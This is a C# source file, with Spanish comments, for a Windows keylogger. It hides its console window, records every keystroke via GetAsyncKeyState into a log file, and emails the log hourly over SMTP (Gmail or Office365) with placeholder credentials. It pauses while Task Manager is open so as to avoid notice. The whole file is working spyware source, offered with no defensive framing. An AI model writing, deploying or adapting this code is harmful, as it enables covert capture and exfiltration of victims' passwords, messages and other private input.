using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Diagnostics;
using System.Net;

// Start Main
[DllImport("kernel32.dll")]//dependencias
static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("user32.dll")]
static extern int GetAsyncKeyState(Int32 i);

//5 : show the console
//0 : hide the console
const int SW_HIDE = 0;

var handle = GetConsoleWindow();


// Hide the main Console
ShowWindow(handle, SW_HIDE);

while(true && Process.GetProcessesByName("Taskmgr").Length==0)// if taskManager get open
{
	int keyState;
	var HoraFinal = DateTime.Now.AddHours(1);

	string rutaDelArchivo = Directory.GetCurrentDirectory() + "/LogKeys.txt";

	
	using (StreamWriter EscritorDeTexto = new StreamWriter(rutaDelArchivo))
	{
		EscritorDeTexto.Write($"Fecha de Registro: {DateTime.Now.ToString("f")}\n\n");
		var mensaje = Console.CapsLock ? "Caps Lock Activated" : "Caps Lock Desactivated";
		EscritorDeTexto.Write(mensaje + "\n\n");
	}
	while (DateTime.Now != HoraFinal && Process.GetProcessesByName("Taskmgr").Length == 0)//send email every hour or when task manager get open
	{
		Thread.Sleep(10);
		for (int i = 1; i < 255; i++)
		{
			keyState = GetAsyncKeyState(i);
			// replace 32769 with -32767 for windows != 10.
			if (keyState == 32769)
			{
				if (EscribioTeclasEspecialesEnArchivo(i, rutaDelArchivo) == false)
				{
					using (StreamWriter writetext = File.AppendText(rutaDelArchivo))
					{
						writetext.Write((char)i);
					}
				}
				break;
			}
		}
	}
	EnviarCorreo(rutaDelArchivo);
}

//end main

bool EscribioTeclasEspecialesEnArchivo(int letra, string ruta)
{
	using (StreamWriter writetext = File.AppendText(ruta))//Esto es anexar texto, basicamente añadirle texto al archivo en vez de eliminarlo
	{
		switch (letra)
		{
			case (int)ConsoleKey.Spacebar:
				{
					writetext.Write(" ");
					break;
				}
			case (int)ConsoleKey.LeftWindows:
			case (int)ConsoleKey.RightWindows:
				{
					writetext.Write("[Windows]");
					break;
				}
			case (int)ConsoleKey.RightArrow:
				{
					writetext.Write("[Right]");
					break;
				}
			case (int)ConsoleKey.UpArrow:
				{
					writetext.Write("[Up]");
					break;
				}
			case (int)ConsoleKey.LeftArrow:
				{
					writetext.Write("[Left]");
					break;
				}
			case (int)ConsoleKey.DownArrow:
				{
					writetext.Write("[Down]");
					break;
				}
			case (int)ConsoleKey.Enter:
				{
					writetext.Write("[Enter]\n");
					break;
				}
			case (int)ConsoleKey.Escape:
				{
					writetext.Write("[Esc]");
					break;
				}
			case (int)ConsoleModifiers.Shift:
				{
					writetext.Write("(Shift)+");
					break;
				}
			case (int)ConsoleKey.Tab:
				{
					writetext.Write("Tab");
					break;
				}
			case (int)ConsoleKey.Backspace:
				{
					writetext.Write("[BACKSPACE]");
					break;
				}
			case (int)ConsoleModifiers.Control:
				{
					writetext.Write("(Control)+");
					break;
				}
			case (int)ConsoleModifiers.Alt:
				{
					writetext.Write("(Alt)+");
					break;
				}

			default: return false;
		}
		return true;
	}
}

void EnviarCorreo(string ruta)
{
	MailMessage correo = new MailMessage();

	correo.From = new MailAddress("MAIL_FROM", "USERNAME_FROM");//Out email
	correo.To.Add("MAIL_TO"); //To email
	correo.Subject = "KeyLoggerTest"; //Subject
	correo.Body = "Este es un correo de prueba desde c#"; //Mensaje del correo
	correo.IsBodyHtml = true;/

	SmtpClient smtp = new SmtpClient();//Para conectarme
	smtp.UseDefaultCredentials = false;

	/*POR SI USAS GMAIL*/
	smtp.Host = "smtp.gmail.com"; //Host del servidor de correo
	smtp.Port = 25; //Puerto de salida
	/*Por si usas hotmail*/
	smtp.Host = "smtp.office365.com";
	smtp.Port = 587;

	smtp.Credentials =new NetworkCredential("mail","password");//Cuenta de correo

	
	smtp.EnableSsl = true;//True si el servidor de correo permite ssl

	correo.Attachments.Add(new Attachment(GetStreamFile(ruta), $"LogKey_{DateTime.Now.ToString("mm/HH/dd/MMM/yyyy")}.txt"));// LogKey_02:0905Jul2022.Txt
	smtp.Send(correo);
}
Stream GetStreamFile(string filePath)
{
	using (FileStream fileStream = File.OpenRead(filePath))
	{
		MemoryStream memStream = new MemoryStream();
		memStream.SetLength(fileStream.Length);
		fileStream.Read(memStream.GetBuffer(), 0, (int)fileStream.Length);
		return memStream;
	}
}